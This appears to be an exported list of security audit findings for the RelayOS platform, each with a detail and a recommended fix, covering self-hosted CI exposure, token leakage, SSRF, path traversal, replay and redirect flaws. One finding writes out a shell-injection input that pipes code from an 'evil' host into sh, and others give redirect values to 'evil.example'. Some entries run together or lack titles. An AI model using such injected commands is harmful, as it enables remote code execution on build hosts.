entries.title: Self-hosted runners execute untrusted pull_request workflows with host access
entries.normalizedTitle: self hosted runners execute untrusted pull request workflows with host access
entries.detail: Every CI job uses runs-on: [self-hosted, nixos] and the workflow triggers on pull_request with no approval gate. A PR (including from a fork for workflow definition + job code) runs arbitrary steps on the persistent self-hosted host: read local credentials/files, inspect concurrent job workspaces, pivot to LAN services, or implant persistence. Same-repo PRs also receive secrets.TURBO_TOKEN (lines 27, 83, 146, 209, 268), enabling remote-cache token theft; fork PRs lack GitHub secrets but still get full host/network access.
entries.recommendedFix: Run untrusted PR jobs on GitHub-hosted runners (or an ephemeral, non-privileged pool); require a maintainer approval environment before any self-hosted PR job; never map repository secrets into pull_request jobs (use push-to-main only for TURBO_TOKEN).

entries.title: TURBO_TOKEN available to same-repo pull_request jobs
entries.normalizedTitle: turbo token available to same repo pull request jobs
entries.detail: quality/test/e2e jobs inject secrets.TURBO_TOKEN on pull_request. Currently requires push access to a repo branch (fork PRs do not receive secrets), so an external fork cannot steal it today; a compromised collaborator branch PR can exfiltrate the Vercel turbo token and abuse remote cache read/write. Becomes medium/high if external collaborators get write or if org settings expose secrets more broadly.
entries.recommendedFix: Gate TURBO_TOKEN on github.event_name != 'pull_request' (or only on main push / a protected environment) so PR CI falls back to local .turbo only.

entries.title: GITHUB_TOKEN interpolated into run script for docker login
entries.normalizedTitle: github token interpolated into run script for docker login
entries.detail: echo "${{ secrets.GITHUB_TOKEN }}" | docker login writes the token into the job script material on the self-hosted runner disk (and briefly into process state). Nearby FLY_API_TOKEN correctly uses env-var piping (line 210). Unreachable remotely without runner/host access; concurrent or residual access on the shared self-hosted machine could recover the token from the script file before cleanup.
entries.recommendedFix: Pass the token only via env (e.g. env: GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }} then echo "$GHCR_TOKEN" | docker login … --password-stdin) or reuse docker/login-action with a shared DOCKER_CONFIG; never expand secrets into the run: script body.

entries.title: workflow_dispatch version input interpolated into shell before validation
entries.normalizedTitle: workflow dispatch version input interpolated into shell before validation
entries.detail: VERSION="${{ inputs.version }}" is expanded by Actions into the script text, so metacharacters in the dispatch input (e.g. 1.0.0"; curl evil|sh; VERSION="1.0.0) execute on the self-hosted release runner before the package.json equality check. Currently requires workflow_dispatch rights (typically write), which often already allows editing workflows—so impact is defense-in-depth unless a narrower token can only dispatch. Tag path uses shell vars and is not affected the same way.
entries.recommendedFix: Map inputs.version through env (env: VERSION: ${{ inputs.version }}) and reference only "$VERSION"; reject unless it matches ^[0-9]+\.[0-9]+\.[0-9]+([.-][0-9A-Za-z.-]+)?$ before any other use.

entries.title: extractBundle() writes entry.name through path.join(destDir, entry.name) with no normalization or ../absolute-path rejection
entries.normalizedTitle: extractbundle writes entry name through path join destdir entry name with no normalization or absolute path rejection
entries.detail: extractBundle() writes entry.name through path.join(destDir, entry.name) with no normalization or ../absolute-path rejection. It is not currently on the marketplace install path, but it is an exported helper and test fixture code already exercises extraction. Fix: Reuse normalizeArchivePath-style validation before writing, and assert the resolved target stays under destDir.
entries.recommendedFix: Reuse normalizeArchivePath-style validation before writing, and assert the resolved target stays under destDir.

entries.title: resolved.graph is trusted as typed JSON, and the bundle cache path is built from entry.id.replace("/", "-"), which only replaces the first slash and does not assert entry.id === defineManifest(entry.manifest).id
entries.normalizedTitle: resolved graph is trusted as typed json and the bundle cache path is built from entry id replace which only replaces the first slash and does not assert entry id definemanifest entry manifest id
entries.detail: resolved.graph is trusted as typed JSON, and the bundle cache path is built from entry.id.replace("/", "-"), which only replaces the first slash and does not assert entry.id === defineManifest(entry.manifest).id. A compromised or malicious marketplace can return an id like a/b/../../../target, causing path.join() normalization to write the downloaded bundle outside the intended store directory if the process has permission. Fix: Runtime-validate resolve responses, derive the filename from the validated manifest id or a strict slug encoder, and assert the resolved id matches the manifest id before writing.
entries.recommendedFix: Runtime-validate resolve responses, derive the filename from the validated manifest id or a strict slug encoder, and assert the resolved id matches the manifest id before writing.

entries.title: relayos lock verify unpacks lock bundles using the CLI's legacy tar/gzip unpackBundle() and expects manifest.json inside the archive, while the current publish/install path uses packArchive() with the manifest outside the archive and computes computeManifestDigest(manifest, bundle)
entries.normalizedTitle: relayos lock verify unpacks lock bundles using the cli s legacy tar gzip unpackbundle and expects manifest json inside the archive while the current publish install path uses packarchive with the manifest outside the archive and computes computemanifestdigest manifest bundle
entries.detail: relayos lock verify unpacks lock bundles using the CLI's legacy tar/gzip unpackBundle() and expects manifest.json inside the archive, while the current publish/install path uses packArchive() with the manifest outside the archive and computes computeManifestDigest(manifest, bundle). The verifier can fail to validate real installed marketplace bundles, weakening the local tamper-check story. Fix: Store the manifest alongside the resolved bundle in the lock/store, or verify using the same packArchive + external manifest contract as install.
entries.recommendedFix: Store the manifest alongside the resolved bundle in the lock/store, or verify using the same packArchive + external manifest contract as install.

entries.title: Credentials written then chmod'd (TOCTOU window)
entries.normalizedTitle: credentials written then chmod d toctou window
entries.detail: saveCredentials uses writeFileSync without an atomic mode, then chmodSync(0o600). On POSIX with a typical umask (e.g. 022) the file is briefly world-readable before chmod. A concurrent local user who can open the new path during that window can read the CLI bearer token. Unreachable from remote/untrusted network input today; becomes practical on multi-user hosts (shared CI/dev boxes) where another UID can race the write.
entries.recommendedFix: Create with restrictive mode from the start (e.g. open/write temp with mode 0o600 then rename, or writeFileSync(path, data, { mode: 0o600 }) and re-chmod after overwrite), and mkdir the config dir as 0o700.

entries.title: downloadBundle fetches arbitrary absolute URLs (SSRF)
entries.normalizedTitle: downloadbundle fetches arbitrary absolute urls ssrf
entries.detail: downloadBundle(bundleUrl) calls fetch(bundleUrl) with no allowlist against opts.baseUrl or https-only policy. install resolves a graph then downloads each entry.bundleUrl from the marketplace response, so a malicious or compromised marketplace (or MITM of RELAYOS_MARKETPLACE_URL) can force the CLI to GET internal targets (link-local metadata, localhost daemon/admin ports, RFC1918) before any digest check runs. Side effects and response exfiltration are limited to what a GET from the operator host can reach; digest mismatch only rejects after the request.
entries.recommendedFix: Reject non-http(s) schemes; require bundleUrl origin to match marketplace baseUrl (or an explicit CDN allowlist); optionally stream with a max byte cap before buffering.

entries.title: contentDigest path segment not URL-encoded
entries.normalizedTitle: contentdigest path segment not url encoded
entries.detail: yankRevision interpolates contentDigest raw into the path while extensionId uses encodeURIComponent. A digest containing '/' or '?' can alter the request path. Currently only the operator-supplied CLI yank args (with admin token) reach this; not attacker-reachable without already holding publish/yank credentials. Becomes more serious if untrusted digests are ever passed through this client.
entries.recommendedFix: encodeURIComponent(contentDigest) (and validate digests as hex sha256 at the call boundary).

entries.title: Install errors echo raw marketplace failure strings to the client
entries.normalizedTitle: install errors echo raw marketplace failure strings to the client
entries.detail: On classified install failures the handler calls fail(..., { detail: message }) with the full Error.message. MarketplaceClient builds those messages as marketplace_request_failed:...:body=${text} / marketplace_bundle_fetch_failed:...:body=${text}, and the RPC dispatcher writes CapabilityError.details into the HTTP JSON body. Any workflows:write caller can read marketplace HTTP error bodies (stack traces, internal URLs, HTML) via packages.install. Currently low because marketplace base URL is operator-configured trusted infrastructure and the caller already has install rights; becomes medium if marketplace is mispointed at an internal host or returns sensitive payloads.
entries.recommendedFix: Return only the typed error code/catalog message to clients; log the raw marketplace body server-side. At most include status code and a redacted, length-capped snippet, never the full response body.

entries.title: Runner invite TTL has no upper bound
entries.normalizedTitle: runner invite ttl has no upper bound
entries.detail: ttlSeconds is only checked for finite and > 0, then passed through as ttlMs to createMachineInvite, which likewise only rejects non-positive TTL. Spec allows any positive int; unlike identity invites (max 604_800s), a runners:admin caller can mint a single-use enrollment token that remains valid for years. If that rawToken is leaked (chat, logs, ticket) an attacker can register a runner into the tenant until first use or revoke.
entries.recommendedFix: Cap ttlSeconds in this binding and/or control-plane createMachineInvite (e.g. default 1h, max 24h or 7d matching identity invites); reject above-max with INVALID_TTL.

entries.title: Raw SQL identifier interpolation of fixture DB name
entries.normalizedTitle: raw sql identifier interpolation of fixture db name
entries.detail: DROP/CREATE/DROP DATABASE statements embed FIXTURE_DB_NAME via template string rather than a bound parameter. The name is a module constant (relayos_migration_fixture) and the helper is test-only, so there is no current abuse path from untrusted input.
entries.recommendedFix: None required while the name stays a constant; if it ever becomes configurable, validate against ^[a-z_][a-z0-9_]*$ before interpolation (Postgres identifiers cannot be bound as parameters).

entries.title: Runner replay guard defaults to in-memory nonce store
entries.normalizedTitle: runner replay guard defaults to in memory nonce store
entries.detail: Runner auth uses InMemoryNonceStore unless RELAYOS_RUNNER_NONCE_STORE=postgres. Cloud is multi-instance (tenant-affinity DO fan-out + deploy-overlap containers) and daemon-host never sets that env, so each replica has an independent seen-nonce set while machines/signatures live in shared Postgres. An attacker who obtains one valid signed runner request (TLS intercept on a non-HTTPS sandbox dial, compromised proxy/header logs, or runner-host outbound capture) can replay it within TIMESTAMP_WINDOW_MS (60s) to another instance or after a cold start that wiped memory. Replaying POST .../jobs/claim re-invokes claimNextExecutionJob and can reserve the next queued job for that runner, returning a projected job envelope. Design docs already require postgres for multi-instance.
entries.recommendedFix: Default to PostgresNonceStore whenever the daemon uses shared Postgres multi-instance (or always when DATABASE_URL is set); set RELAYOS_RUNNER_NONCE_STORE=postgres in daemon-host envVars; optionally fail boot if process role is multi-replica and the store is still memory.

entries.title: Publisher keys TOFU-fetched from marketplace with empty pin set
entries.normalizedTitle: publisher keys tofu fetched from marketplace with empty pin set
entries.detail: SignatureVerifier is constructed with knownKeys: new Map() and fetchPublicKey → GET /v1/publishers/{ns}/key on the same marketplace baseUrl that serves bundles. Pins are process-memory only (not persisted). Abuse path: compromise or MITM of the marketplace (or a post-restart key swap) returns an attacker Ed25519 key; ensureBundleCached then accepts attacker-signed digests as valid publisher signatures, defeating the fail-closed signature gate that is intended to protect against a compromised marketplace worker.
entries.recommendedFix: Ship a durable trust store (config/lockfile) of namespace→publicKey, refuse TOFU for first-party namespaces, and only accept marketplace key fetch for unknown namespaces under explicit operator policy; re-verify pins across process restarts.

entries.title: downloadBundle interpolates contentDigest into URL without isValidDigest
entries.normalizedTitle: downloadbundle interpolates contentdigest into url without isvaliddigest
entries.detail: downloadBundle builds .../revisions/${contentDigest}/bundle without encodeURIComponent or isValidDigest. A digest containing path segments (e.g. ../ or extra /) can rewrite the request path against baseUrl. Currently unreachable from the install path because ensureBundleCached/getRevision reject non-^[0-9a-f]{64}$ digests before calling downloadBundle; becomes reachable if downloadBundle is called directly with untrusted input.
entries.recommendedFix: Call isValidDigest(contentDigest) at the start of downloadBundle and encode the digest as a single path segment.

entries.title: Provider config.inputs schema is never validated before invoke
entries.normalizedTitle: provider config inputs schema is never validated before invoke
entries.detail: resolveProvider records action.config.inputs but loadProviderData passes request.inputs straight into ExtensionRunner without compiling/validating that schema (only provider output is checked against previewDataSchema). Currently unreachable from untrusted RPC input: the only production caller (projectReviewBodyForArtifact) supplies store artifact metadata, not client body fields. Becomes exploitable if render() is exposed over RPC or metadata becomes attacker-writable without schema checks.
entries.recommendedFix: When provider.inputs is present, ajv.compile it and reject request.inputs before runner.invoke.

entries.title: Provider match uses extension-supplied RegExp on request inputs
entries.normalizedTitle: provider match uses extension supplied regexp on request inputs
entries.detail: providerMatches does new RegExp(config.match.pattern, "u") and pattern.test(value) on caller inputs. A pathological pattern can ReDoS the daemon thread during render/match. Currently requires an installed extension that declares a hostile uri-pattern (install path is signature-gated); becomes higher severity if untrusted extensions can be installed without review.
entries.recommendedFix: Cap pattern length, prefer a safe matcher (glob/prefix), or run match with a timeout/size limit and fail closed on catastrophic patterns.

entries.title: runGateway JSDoc claims /rpc/* is authenticated here, but code only enforces transport policy
entries.normalizedTitle: rungateway jsdoc claims rpc is authenticated here but code only enforces transport policy
entries.detail: RPC paths return from runGateway after transport policy; identity resolution and trusted header injection happen later in prepareCapabilityRequest, contrary to the ownership comment.
entries.recommendedFix: Gateway documentation names the actual path-class boundary and deferred RPC authentication owner.

entries.title: Top-up success/cancel URL accepts unvalidated client returnUrl (open redirect after payment)
entries.normalizedTitle: top up success cancel url accepts unvalidated client returnurl open redirect after payment
entries.detail: Authenticated tenant member supplies an absolute returnUrl; the gateway concatenates it into Stripe success/cancel URLs; Stripe later redirects the payer to the supplied origin.
entries.recommendedFix: The server constructs fixed success/cancel URLs from daemonPublicUrl and never consumes a client-authored return origin.

entries.title: Unauthenticated-origin returnUrl becomes Stripe success/cancel redirect
entries.normalizedTitle: unauthenticated origin returnurl becomes stripe success cancel redirect
entries.detail: Any authenticated tenant member can POST /api/billing/topups with an arbitrary returnUrl. That value is concatenated into successUrl/cancelUrl and passed through to Stripe Checkout with no same-origin/allowlist check. Attacker creates a top-up for their tenant with returnUrl=https://evil.example/phish, sends the Stripe Checkout link to a victim; after payment, credits land on the attacker tenant and Stripe redirects the victim’s browser to the attacker URL (?topup=done), enabling post-payment phishing / credential harvest while the victim believes they stayed on RelayOS.
entries.recommendedFix: Allowlist returnUrl to deps.daemonPublicUrl / deps.allowedBrowserOrigins (same origin, http(s) only); reject or ignore any other value and always build success/cancel URLs from that allowlisted base.

entries.title: Unauthenticated CLI device authorization init has no rate limit and inserts unbounded rows
entries.normalizedTitle: unauthenticated cli device authorization init has no rate limit and inserts unbounded rows
entries.detail: Every unauthenticated init request inserts a ten-minute pending authorization row before any peer admission or cleanup bound.
entries.recommendedFix: A durable peer budget is consumed before allocation, and each successful init performs bounded catch-up cleanup.

entries.title: CLI user-code info endpoint is unauthenticated and unthrottled
entries.normalizedTitle: cli user code info endpoint is unauthenticated and unthrottled
entries.detail: An anonymous caller can test user codes and receive client name, requested scopes, expiry, and approval state for a live authorization without a peer budget.
entries.recommendedFix: Metadata lookup requires an identity-global session and independent peer/identity budgets.

entries.title: Unauthenticated CLI device init has no rate limit or row purge
entries.normalizedTitle: unauthenticated cli device init has no rate limit or row purge
entries.detail: POST /api/auth/cli/init is anonymous and always inserts a cli_device_authorizations row (plus security event) with a 10-minute TTL. There is no route- or store-level rate limit, and expired/pending rows are never deleted. An unauthenticated client can flood init to grow the table and event log without bound (disk/IO/connection exhaustion). device_code entropy is strong and user_code guessing is not practical; the abuse is pure resource exhaustion.
entries.recommendedFix: Add per-IP (and optionally global) rate limits on /api/auth/cli/init (and poll/info); periodically DELETE expired/consumed authorizations (or cap live pending rows per peer).

entries.title: Password login rate-limit key uses only socket peer IP, enabling global per-email lockout behind reverse proxies
entries.normalizedTitle: password login rate limit key uses only socket peer ip enabling global per email lockout behind reverse proxies
entries.detail: Behind a reverse proxy, login hashes normalized email with the shared socket peer while anonymous email admission already has a trusted proxy-token client-address path; unrelated clients therefore share an account lockout key.
entries.recommendedFix: Password admission consumes the trusted normalized client-address helper owned by the password-login hardening design.

entries.title: Signup accepts unbounded displayName (contract max 160)
entries.normalizedTitle: signup accepts unbounded displayname contract max 160
entries.detail: Abuse path: with RELAYOS_SIGNUP_MODE=open, attacker passes challenge + rate-limit admit and posts a displayName up to the shared 1 MiB JSON body cap. Route only requires non-empty trim; registerPasswordlessIdentity persists it without truncation while IdentityRecord contracts max displayName at 160. Low today because anonymous email auth is challenge+rate-limited and body-capped (not free mass write). Severity rises if body limits are raised or displayName is mirrored into shared UI/email surfaces without further bounds.
entries.recommendedFix: Reject or truncate displayName to ≤160 chars in readSignupInput (match IdentityRecord / tenants title policy) before enqueueSignup.

entries.title: Authenticated tenant create has no per-identity rate limit or quota
entries.normalizedTitle: authenticated tenant create has no per identity rate limit or quota
entries.detail: Abuse path: any session-authenticated identity can loop POST /api/auth/tenants and mint unbounded tenants (plus owner grant, principal link, security events) with no throttle in this handler or createTenantForIdentity. Low today because unauthenticated callers get 401 and self-serve create is intentional product surface; impact is shared-DB resource growth rather than auth bypass. Becomes medium under open signup with no cost gate if create triggers expensive provisioning side effects.
entries.recommendedFix: Add per-identity (and optionally per-IP) rate limiting and/or a max-tenants-owned quota before createTenantForIdentity; return 429/403 with a stable error code when exceeded.

entries.title: extract(digest, archive) trusts the caller-supplied digest as the content-address dir name and does NOT recompute computeManifestDigest over the bytes before extracting
entries.normalizedTitle: extract digest archive trusts the caller supplied digest as the content address dir name and does not recompute computemanifestdigest over the bytes before extracting
entries.detail: extract(digest, archive) trusts the caller-supplied digest as the content-address dir name and does NOT recompute computeManifestDigest over the bytes before extracting. Sole caller today (SystemProfileReconciler) feeds trusted builtins, and the untrusted install path (extension-installer.ts:61) verifies digest first, so not exploitable now. But it's an unguarded primitive: a future caller wiring marketplace/third-party bundles through extract() without verifying would extract substituted bytes under the claimed digest. Zip-slip mitigated upstream (normalizeArchivePath rejects ../absolute; no symlink entries). Fix: Make extract() self-verifying: recompute computeManifestDigest(manifest, archive) and assert == digest before writing, throwing on mismatch.
entries.recommendedFix: Make extract() self-verifying: recompute computeManifestDigest(manifest, archive) and assert == digest before writing, throwing on mismatch.

entries.title: reviewPacket has no principal/ownership authorization
entries.normalizedTitle: reviewpacket has no principal ownership authorization
entries.detail: reviewPacket(artifactId) loads getArtifactDetail, blob bytes, and full review projection for any id with no principal or membership check. RPC surfaces.review-packet binds this with only workspace:read and no requireActingPrincipal (unlike inbox/history/recent). Abuse path: any identity in the tenant with workspace:read who can guess/obtain another principal's artifact id (e.g. from history/recent) reads the full review packet and body that inbox would not have listed for them.
entries.recommendedFix: Require an acting principal and enforce artifact/gate visibility (inbox membership, principal on active gate, or explicit share) before returning the packet; return 404/403 otherwise.

entries.title: history and recent enumerate all tenant artifacts ignoring principal
entries.normalizedTitle: history and recent enumerate all tenant artifacts ignoring principal
entries.detail: history() uses store.listArtifacts() and recent() uses listRecentArtifacts(5) with no principalId filter, while inbox(principalId) is principal-scoped. RPC surfaces.workspace-recent advertises “for the acting principal” and resolves a principal then discards it. Abuse path: principal A with workspace:read enumerates titles/ids/summaries of work assigned to other principals and uses those ids with reviewPacket.
entries.recommendedFix: Filter history/recent by acting principal (or documented shared-scope policy), and pass principalId into the service methods from the RPC bindings.

entries.title: history() materializes every artifact with no limit
entries.normalizedTitle: history materializes every artifact with no limit
entries.detail: history() loads listArtifacts() for the whole tenant, then batches runs/events/anchors over that full set. Abuse path: a workspace:read caller repeatedly hits surfaces.workspace-history on a large tenant, forcing full-table materialization and large response payloads each time (no pagination/cursor).
entries.recommendedFix: Add pagination/cursors and server-side limits (and optionally principal filters) instead of loading all artifacts per request.

entries.title: Non-OK control-plane responses skip daemon signature verification
entries.normalizedTitle: non ok control plane responses skip daemon signature verification
entries.detail: observeServerTime() runs on every response, but verifyDaemonResponse() only runs when response.ok. An on-path attacker who can inject or alter HTTP responses (cleartext RELAYOS_SERVER_URL, broken TLS, or hostile proxy) can forge status 401/403 without a valid X-RelayOS-Daemon-Signature. classifyStatus maps those to auth_invalid; the supervisor then clears in-memory identity and enters re-registration with inviteToken already nulled, DoSing the runner until process restart. The same unauthenticated SERVER_TIME_HEADER can skew ClockOffset and push subsequent signed timestamps outside the daemon window. Unreachable today when the runner has a pinned daemon key and a trustworthy HTTPS path to the real daemon with no MITM.
entries.recommendedFix: Always verifyDaemonResponse (or at least authenticate SERVER_TIME_HEADER) before observeServerTime/classifyStatus for signed endpoints; only treat auth_invalid after a signature-valid error body, otherwise map unsigned/invalid-sig failures to protocol_error/transient.

entries.title: Job failure results include Error.stack in rawOutput
entries.normalizedTitle: job failure results include error stack in rawoutput
entries.detail: toFailureResult() sends error.stack (local paths, code locations, sometimes nested messages) to completeJob. Tenants/operators viewing failed run results can see host filesystem layout and runner internals. Not remotely exploitable by itself; disclosure is to the control plane that already receives job outcomes.
entries.recommendedFix: Send a stable error code/summary only; keep stacks in local logs, or redact paths before assigning rawOutput.

entries.title: Missing daemon public key disables all response authentication
entries.normalizedTitle: missing daemon public key disables all response authentication
entries.detail: verifyDaemonResponse returns true when signer.daemonPublicKey is null, so claim/download/complete bodies are accepted without integrity or origin checks. Reachable when identity comes from env without RELAYOS_DAEMON_PUBLIC_KEY, or a persisted identity with null pin (sandbox path). On-path attackers can then forge job envelopes (credentials, proxy tickets) and input blobs. Unreachable for normal enrolled runners that pin daemonPublicKey at registration.
entries.recommendedFix: Fail closed unless an explicit allow-unverified-sandbox flag is set; require RELAYOS_DAEMON_PUBLIC_KEY for env-injected identities.

entries.title: MCP path suffix allows .. traversal off the gateway binding
entries.normalizedTitle: mcp path suffix allows traversal off the gateway binding
entries.detail: handle() builds targetUrl via new URL(joinUrlPath(binding.gatewayPath, suffix)+search, serverBaseUrl). WHATWG normalization collapses segments like /api/tool-gateway/{id}/../../../api/machines/{runnerId}/jobs/claim to other daemon paths. The proxy then signRequestHeaders over that path and forwards with the runner private key (and gateway ticket). Any loopback client that can reach the ephemeral proxy (the agent/driver under prompt injection, or another local process that learns the port/bindingId) can use the runner as a confused deputy against non-gateway machine APIs—claim/complete/download—expanding beyond the intended binding-scoped tool gateway. Daemon-side gateway traversal checks never run because the request no longer matches /api/tool-gateway/*.
entries.recommendedFix: Resolve the joined path, require it stays under the binding gatewayPath prefix (reject ., .., backslashes, and encoded separators), and only then sign/forward; mirror packages/domains/mcp assertNoGatewayTraversal.

entries.title: The provider resolves user-supplied file://, absolute, or home-relative repoPath, then spawns git with that path as cwd and returns parsed diff output
entries.normalizedTitle: the provider resolves user supplied file absolute or home relative repopath then spawns git with that path as cwd and returns parsed diff output
entries.detail: The provider resolves user-supplied file://, absolute, or home-relative repoPath, then spawns git with that path as cwd and returns parsed diff output. With the manifest match above, local preview rendering can read diffs from arbitrary accessible Git repositories, not just the current RelayOS workspace. Fix: Resolve and enforce an allowed root before spawning git; reject symlink escapes after realpath.
entries.recommendedFix: Resolve and enforce an allowed root before spawning git; reject symlink escapes after realpath.

entries.title: git diff stdout/stderr are accumulated into unbounded strings and there is no timeout
entries.normalizedTitle: git diff stdout stderr are accumulated into unbounded strings and there is no timeout
entries.detail: git diff stdout/stderr are accumulated into unbounded strings and there is no timeout. A huge diff or slow Git process can consume extension-runner memory or hang preview generation. Fix: Add a max output byte cap, pass -- where path args are ever introduced, and kill the child after a short preview timeout.
entries.recommendedFix: Add a max output byte cap, pass -- where path args are ever introduced, and kill the child after a short preview timeout.

entries.title: GitDiffFetcherInput accepts raw repoPath, branchRef, and optional baseRef strings with no format or length limits
entries.normalizedTitle: gitdifffetcherinput accepts raw repopath branchref and optional baseref strings with no format or length limits
entries.detail: GitDiffFetcherInput accepts raw repoPath, branchRef, and optional baseRef strings with no format or length limits. The implementation uses argv arrays, so this is not command injection, but it allows odd ref names and very large inputs to reach git and error/log paths. Fix: Validate repo path form, cap string lengths, and reject refs that start with - or contain control characters.
entries.recommendedFix: Validate repo path form, cap string lengths, and reject refs that start with - or contain control characters.

entries.title: readAllBytes() buffers an entire stream into memory with no byte cap
entries.normalizedTitle: readallbytes buffers an entire stream into memory with no byte cap
entries.detail: readAllBytes() buffers an entire stream into memory with no byte cap. It is a convenience helper, but InMemoryBlobStore.put() uses it for streamed input, so a caller that forgets an upstream limit can allocate arbitrarily large buffers. Fix: Add a capped variant or require a maxBytes argument for stream reads.
entries.recommendedFix: Add a capped variant or require a maxBytes argument for stream reads.

entries.title: put() accepts unbounded stream/buffer size
entries.normalizedTitle: put accepts unbounded stream buffer size
entries.detail: put() streams arbitrary content to disk with no maxBytes/max size guard; expectedSize only verifies a caller-supplied length after the full write. Digest inputs for get/has/delete are constrained to /^[0-9a-f]{64}$/, so path traversal is blocked, but a caller that forwards untrusted upload bytes can fill the volume. Currently low because put is only used by authenticated/internal services (daemon/marketplace/environment) rather than a public unauthenticated endpoint; becomes medium if any multi-tenant upload path calls put without an HTTP/body size cap.
entries.recommendedFix: Add an optional maxBytes on LocalFilesystemBlobStoreOptions/PutOptions and abort streamToFileWithDigest when size exceeds the cap before rename into blobs/.

entries.title: BlobStore.put exposes expectedSize but no maxBytes option
entries.normalizedTitle: blobstore put exposes expectedsize but no maxbytes option
entries.detail: BlobStore.put exposes expectedSize but no maxBytes option. Callers must remember to enforce size before or during upload; the storage primitive cannot fail closed for oversized streams. Fix: Add maxBytes to PutOptions and require implementations to stop reading/writing once exceeded.
entries.recommendedFix: Add maxBytes to PutOptions and require implementations to stop reading/writing once exceeded.

entries.title: allowedResolutionKindsForState is a pure advisory transition table with NO principal/role/principal-kind enforcement — the package is type/data only and enforces none of CORE_INVARIANTS
entries.normalizedTitle: allowedresolutionkindsforstate is a pure advisory transition table with no principal role principal kind enforcement the package is type data only and enforces none of core invariants
entries.detail: allowedResolutionKindsForState is a pure advisory transition table with NO principal/role/principal-kind enforcement — the package is type/data only and enforces none of CORE_INVARIANTS. entries.title: computeSha256 is correct, but the marketplace content digest is computed over BUNDLE BYTES ONLY, not the manifest — while canonical-id.ts documents digest = sha256(manifest||bundle)

entries.detail: computeSha256 is correct, but the marketplace content digest is computed over BUNDLE BYTES ONLY, not the manifest — while canonical-id.ts documents digest = sha256(manifest||bundle). The manifest (permissions[], imports[]) is stored in the DB unbound to the content address and trusted by resolve/install. So permissions/import-graph can be altered without changing the digest the daemon trusts. Fix: Make the content digest cover manifest+bundle (as canonical-id claims) or store+verify a separate manifest digest; daemon installer must verify the manifest against the address before trusting permissions/imports.
entries.recommendedFix: Make the content digest cover manifest+bundle (as canonical-id claims) or store+verify a separate manifest digest; daemon installer must verify the manifest against the address before trusting permissions/imports.

Regex itself is sound. Documented legacy-compat. Fix: Remove un-namespaced acceptance after migrating built-ins; meanwhile restrict empty-namespace publishes to a hard-coded legacy allowlist bound to one trusted tenant.

Import digests ARE pre-validated 64-hex (safe selector). Fix: Verify manifest against content address + a real signature once available; else document resolve output as untrusted until daemon re-verifies.
entries.recommendedFix: Verify manifest against content address + a real signature once available; else document resolve output as untrusted until daemon re-verifies.

entries.title: 'latest' range has no floor; a publisher able to push a high version (gated by publish authz) forces all 'latest' consumers onto it

entries.detail: 'latest' range has no floor; a publisher able to push a high version (gated by publish authz) forces all 'latest' consumers onto it. Parser rejects prereleases + malformed input (no injection). Bounded by publish authz. Fix: Pin by digest in lockfiles so a later high-version push can't silently move installed consumers.
entries.recommendedFix: Pin by digest in lockfiles so a later high-version push can't silently move installed consumers.

entries.title: Open telemetry can forge install and run ranking stats
entries.normalizedTitle: open telemetry can forge install and run ranking stats
entries.detail: recordInstallEvents/recordUsageRollups only require a non-empty installationId and a non-empty array. Marketplace HTTP exposes these unauthenticated (pseudonymous by design). An attacker invents many installationIds and/or huge runCount values for a target extensionId; after materializeStats, installs/activeInstalls30d/runs7d/trendingScore inflate and popular/trending sort can be gamed. No extension existence check, runCount range, or anti-abuse bound is applied in the service.
entries.recommendedFix: Cap batch length and runCount (e.g. 1..N events, 0..reasonable daily max); reject unknown extensionIds; rate-limit by IP and installationId; treat ranking inputs as untrusted (anomaly clamps or signed/attested beacons if ranking must be hard to game).

entries.title: Telemetry batches have no size limit before store writes
entries.normalizedTitle: telemetry batches have no size limit before store writes
entries.detail: Empty-array short-circuit only; there is no max on batch.events/items length. Callers (POST /v1/telemetry/*) pass JSON straight through, so a client can send very large arrays that become sequential store upserts (N DB writes per request) and grow installations/usage tables without bound—resource exhaustion against the marketplace worker/DB.
entries.recommendedFix: Enforce a hard max batch size in the service (reject 413/400 above limit) and rely on edge/IP rate limits; optionally bound total payload bytes at the HTTP layer.

entries.title: hexToBytes accepts non-hex digest bytes as zero
entries.normalizedTitle: hextobytes accepts non hex digest bytes as zero
entries.detail: verifySignature validates signatureHex with /^[0-9a-f]+$/ but not digestHex; hexToBytes maps invalid pairs via parseInt → NaN → 0. Currently unreachable from untrusted publish/install paths: MarketplaceService requires isValidDigest (64 lowercase hex) before verify, and stored digests are SHA-256 hex. Becomes relevant if a future caller passes unvalidated digest strings into verifySignature/signDigest.
entries.recommendedFix: Reject non-[0-9a-f] and odd length (and optionally require length 64 for digests) inside hexToBytes or at the start of signDigest/verifySignature.

entries.title: Every resolved closure entry is emitted with hard-coded signature:'' — the consumer half of the missing-signature gap
entries.normalizedTitle: every resolved closure entry is emitted with hard coded signature the consumer half of the missing signature gap
entries.detail: Every resolved closure entry is emitted with hard-coded signature:'' — the consumer half of the missing-signature gap. The daemon installer downloads from bundleUrl with no signature to verify; authenticity rests on HTTPS-to-marketplace + digest match, no end-to-end publisher attestation. Fix: Surface revision.signature (the record field exists) and have the daemon verify against a pinned namespace key; or remove the field so consumers don't assume a guarantee that's never provided.
entries.recommendedFix: Surface revision.signature (the record field exists) and have the daemon verify against a pinned namespace key; or remove the field so consumers don't assume a guarantee that's never provided.

entries.title: Memory evidence href allows protocol-relative open redirect
entries.normalizedTitle: memory evidence href allows protocol relative open redirect
entries.detail: validMemoryEvidenceRef only requires navigationTarget.href to be non-empty and start with "/". Values like "//evil.example" pass that check but are protocol-relative URLs; KnowledgeMemoryLedger renders navigationTarget.href in a raw <a href>, so a successful parse would navigate off-origin. Currently unreachable from untrusted input because parseMemoryBody has no production call sites and live knowledge evidence hrefs are server-built under /knowledge|/workflows paths; becomes exploitable if untrusted MemoryBody is admitted through this parser into UI that uses href directly.
entries.recommendedFix: Reject hrefs matching /^\/\// (and ideally require a single-app path such as /^\/[A-Za-z0-9][\w./?&=%#\-]{0,511}$/ with no backslashes/control chars); add a unit test for "//evil.example".

entries.title: Unhandled capability errors embed full stack traces in failure.message
entries.normalizedTitle: unhandled capability errors embed full stack traces in failure message
entries.detail: On any thrown error, failure.message is set to `${err.message}\n${err.stack}`. That result is postMessaged to the daemon and can be persisted/surfaced in run diagnostics. A principal who can read failed capability results learns absolute install paths, bundle layout, and internal module structure from the stack frames.
entries.recommendedFix: Put only a short safe message (and optional error code) in failure.message/summary; keep full stacks in daemon-side logs that are not returned on user-facing APIs.

entries.title: Capability existence oracle before authentication
entries.normalizedTitle: capability existence oracle before authentication
